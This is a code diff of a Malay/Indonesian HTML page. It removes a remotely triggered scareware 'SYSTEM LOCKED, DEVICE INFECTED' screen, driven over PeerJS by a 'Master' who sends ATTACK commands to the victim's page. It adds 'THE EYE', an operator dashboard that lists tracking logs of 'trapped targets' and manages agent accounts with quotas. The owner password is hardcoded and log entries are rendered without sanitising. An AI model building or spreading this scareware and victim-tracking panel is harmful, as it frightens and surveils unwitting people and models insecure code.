@@ -2,72 +2,185 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM CRITICAL ERROR</title>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THE EYE - OWNER COMMAND CENTER</title>
     <style>
-        body { background: black; color: white; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
-        .shake { animation: shake-animation 0.1s infinite; }
-        @keyframes shake-animation {
-            0% { transform: translate(5px, 5px); background: red; }
-            50% { transform: translate(-5px, -5px); background: blue; }
-            100% { transform: translate(5px, 5px); }
-        }
-        #lock-box { border: 5px solid red; padding: 30px; background: rgba(0,0,0,0.9); z-index: 100; }
-        h1 { color: red; font-size: 2.5em; text-shadow: 2px 2px white; }
-        input { padding: 15px; width: 80%; text-align: center; font-size: 20px; background: #222; color: lime; border: 1px solid red; }
+        :root { --neon: #00ff00; --bg: #050505; --card: #111; --danger: #ff0000; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        
+        /* LOGIN OVERLAY */
+        #auth-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        input { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 15px; margin: 10px; width: 250px; text-align: center; outline: none; }
+        
+        /* DASHBOARD LAYOUT */
+        #main-ui { display: none; }
+        header { background: #000; border-bottom: 2px solid var(--neon); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 0 15px var(--neon); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 25px; }
+        .card { background: var(--card); border: 1px solid #333; padding: 20px; border-radius: 5px; box-shadow: inset 0 0 10px #000; }
+        .card h2 { margin-top: 0; font-size: 18px; border-bottom: 1px solid var(--neon); padding-bottom: 10px; color: #fff; }
+
+        /* LOG SYSTEM */
+        #log-display { height: 350px; overflow-y: auto; font-size: 12px; line-height: 1.6; background: #000; padding: 10px; border: 1px solid #222; }
+        .log-entry { margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        .log-entry b { color: #fff; }
+        .target-link { color: cyan; text-decoration: none; font-weight: bold; }
+        
+        /* USER MANAGEMENT */
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
+        th, td { border: 1px solid #222; padding: 10px; text-align: left; }
+        th { color: #fff; background: #1a1a1a; }
+        button { background: var(--neon); color: #000; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; font-family: monospace; }
+        button.ban { background: var(--danger); color: #fff; }
+        
+        /* STATUS INDICATOR */
+        .status-bar { padding: 5px 20px; background: #111; font-size: 11px; border-top: 1px solid #333; position: fixed; bottom: 0; width: 100%; }
+        .hidden { display: none; }
+        @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
     </style>
 </head>
-<body id="b">
+<body>
 
-<div id="lock-box">
-    <h1 id="msg">SYSTEM LOCKED!</h1>
-    <p>YOUR DEVICE IS INFECTED. ENTER KEY (2015)</p>
-    <input type="password" id="pw" placeholder="PASSWORD">
-    <br><br>
-    <button onclick="check()" style="padding:10px 20px; background:red; color:white; border:none; font-weight:bold;">DECRYPT</button>
+<div id="auth-overlay">
+    <h1 style="letter-spacing: 10px; text-shadow: 0 0 10px var(--neon);">THE EYE</h1>
+    <p>ENTER OWNER CREDENTIALS</p>
+    <input type="text" id="u-login" placeholder="USERNAME">
+    <input type="password" id="p-login" placeholder="PASSWORD">
+    <button onclick="authOwner()" style="width: 280px; padding: 15px; margin-top: 10px;">INFILTRATE</button>
 </div>
 
-<audio id="aud" loop>
-    <source src="https://www.soundboard.com/handler/Downloadaudio.ashx?id=579626" type="audio/mpeg">
-</audio>
+<div id="main-ui">
+    <header>
+        <div>
+            <span style="font-size: 24px; font-weight: bold;">COMMAND CENTER</span>
+            <span id="rank-tag" style="margin-left: 15px; font-size: 12px; color: #fff; background: red; padding: 2px 10px;">OWNER</span>
+        </div>
+        <button onclick="logout()" style="background:transparent; color:var(--danger); border:1px solid var(--danger);">DISCONNECT</button>
+    </header>
+
+    <div class="grid">
+        <div class="card" style="grid-column: span 2;">
+            <h2>🛰️ LIVE SATELLITE INTERCEPT (HASIL TRACKING)</h2>
+            <div id="log-display">-- Menunggu data masuk dari satelit --</div>
+        </div>
+
+        <div class="card">
+            <h2>👥 USER MANAGEMENT</h2>
+            <div id="user-table-area"></div>
+        </div>
+
+        <div class="card">
+            <h2>🛠️ REGISTER NEW AGENT</h2>
+            <div style="display: flex; flex-direction: column;">
+                <input type="text" id="new-u" placeholder="New Username" style="width: 90%;">
+                <input type="text" id="new-p" placeholder="New Password" style="width: 90%;">
+                <select id="new-r" style="background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 12px; margin: 10px; width: 95%;">
+                    <option value="MEMBER">RANK: MEMBER (3x Quota)</option>
+                    <option value="ADMIN">RANK: ADMIN (5x Quota)</option>
+                </select>
+                <button onclick="addNewUser()" style="margin: 10px; padding: 15px;">AUTHORIZE AGENT</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="status-bar">
+        SYSTEM STATUS: <span style="color:#fff">ENCRYPTED</span> | SERVER: <span style="color:#fff">ACTIVE</span> | REGION: <span style="color:#fff">INDONESIA</span>
+    </div>
+</div>
 
 <script>
-    const b = document.getElementById('b');
-    const aud = document.getElementById('aud');
-    
-    // NAMA BILIK KHAS (Tukar "bilik-jebakan-ali" ikut suka lu, asal sama dengan Master)
-    const PEER_ID = "bilik-jebakan-ali-99"; 
-    const peer = new Peer(PEER_ID); 
+    // Inisialisasi Database Lokal
+    if(!localStorage.getItem("eye_db")) {
+        localStorage.setItem("eye_db", JSON.stringify([{u: "owner", p: "666", role: "OWNER", status: "ACTIVE", quota: 999999}]));
+    }
+    if(!localStorage.getItem("eye_logs")) localStorage.setItem("eye_logs", JSON.stringify([]));
 
-    // Bila Master "Call", mangsa terima arahan
-    peer.on('connection', (conn) => {
-        conn.on('data', (data) => {
-            if(data === "ATTACK") startChaos();
-            if(data === "RELEASE") release();
+    // LOGIN OWNER
+    function authOwner() {
+        const u = document.getElementById('u-login').value;
+        const p = document.getElementById('p-login').value;
+        const db = JSON.parse(localStorage.getItem("eye_db"));
+        const acc = db.find(x => x.u === u && x.p === p);
+
+        if(acc && acc.role === "OWNER") {
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
+            loadDashboard();
+        } else {
+            alert("ACCESS DENIED: NOT AN OWNER!");
+        }
+    }
+
+    // LOAD DATA
+    function loadDashboard() {
+        renderLogs();
+        renderUsers();
+        // Refresh Log Tiap 3 Detik otomatis
+        setInterval(renderLogs, 3000);
+    }
+
+    function renderLogs() {
+        const logs = JSON.parse(localStorage.getItem("eye_logs"));
+        const display = document.getElementById('log-display');
+        
+        if(logs.length === 0) {
+            display.innerHTML = "-- BELUM ADA TARGET YANG TERJEBAK --";
+            return;
+        }
+
+        display.innerHTML = logs.map(entry => `
+            <div class="log-entry">
+                ${entry}
+            </div>
+        `).join("");
+    }
+
+    function renderUsers() {
+        const db = JSON.parse(localStorage.getItem("eye_db"));
+        let html = `<table><tr><th>Agent</th><th>Rank</th><th>Quota</th><th>Status</th><th>Aksi</th></tr>`;
+        
+        db.forEach((user, index) => {
+            if(user.role === 'OWNER') return;
+            html += `<tr>
+                <td><b>${user.u}</b></td>
+                <td>${user.role}</td>
+                <td>${user.quota}</td>
+                <td style="color:${user.status === 'ACTIVE' ? 'var(--neon)' : 'red'}">${user.status}</td>
+                <td>
+                    <button class="ban" onclick="banUser(${index})">TERMINATE</button>
+                </td>
+            </tr>`;
         });
-    });
-
-    function startChaos() {
-        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-        b.classList.add('shake');
-        aud.play().catch(() => {});
-        document.getElementById('msg').innerText = "SYSTEM OVERRIDE!!!";
+        document.getElementById('user-table-area').innerHTML = html + `</table>`;
     }
 
-    function release() {
-        b.classList.remove('shake');
-        aud.pause();
-        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
-        document.getElementById('lock-box').innerHTML = "<h1 style='color:lime'>UNLOCKED</h1>";
+    // MANAJEMEN USER
+    function addNewUser() {
+        const u = document.getElementById('new-u').value;
+        const p = document.getElementById('new-p').value;
+        const r = document.getElementById('new-r').value;
+        const q = (r === 'ADMIN') ? 5 : 3;
+
+        if(!u || !p) return alert("DATA TIDAK BOLEH KOSONG!");
+
+        let db = JSON.parse(localStorage.getItem("eye_db"));
+        db.push({u: u, p: p, role: r, status: "ACTIVE", quota: q});
+        localStorage.setItem("eye_db", JSON.stringify(db));
+        
+        alert("AGENT " + u + " BERHASIL DIDAFTARKAN!");
+        renderUsers();
     }
 
-    function check() {
-        if(document.getElementById('pw').value === "2015") release();
+    function banUser(idx) {
+        let db = JSON.parse(localStorage.getItem("eye_db"));
+        db[idx].status = "BANNED";
+        localStorage.setItem("eye_db", JSON.stringify(db));
+        renderUsers();
     }
 
-    // Paksa Fullscreen & Bunyi bila skrin diklik pertama kali
-    document.body.onclick = () => { startChaos(); };
+    function logout() {
+        location.reload();
+    }
 </script>
+
 </body>
 </html>
